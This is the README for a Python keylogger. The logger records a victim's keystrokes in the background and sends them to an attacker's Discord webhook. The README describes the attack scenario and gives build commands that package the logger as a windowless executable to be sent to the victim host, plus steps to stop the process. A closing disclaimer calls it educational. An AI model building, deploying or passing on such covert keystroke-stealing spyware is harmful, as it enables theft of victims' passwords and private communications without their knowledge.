# Key logger
This is a simple key logger that logs printable and ctrl + key combinations. It send the recorded key strokes to discord channel for the convenient purpose.

### Attack senario
The attacker will first compile the key logger program, and send it to victim host. When the victim run the program, the key logger will start to record the key strokes in background and send it to the attacker's discord channel.

### Compile Program
1. Fill in your discord channel webhook url
2. `pip install -r requirements.txt`
3. `pyinstaller -w -F logger.py`
4. The .exe file will be in the dist folder, send it to victim host

### Stop the program
Because the program runs in background, you needs to find the pid of logger program
1. `tasklist | findstr logger`
2. Kill all the process listed with its pid using `taskkill /PID <pid> /F`

### Disclaimer
This program is for educational purpose only. Do not use it for illegal activities. The author is not responsible for any damage caused by this program.
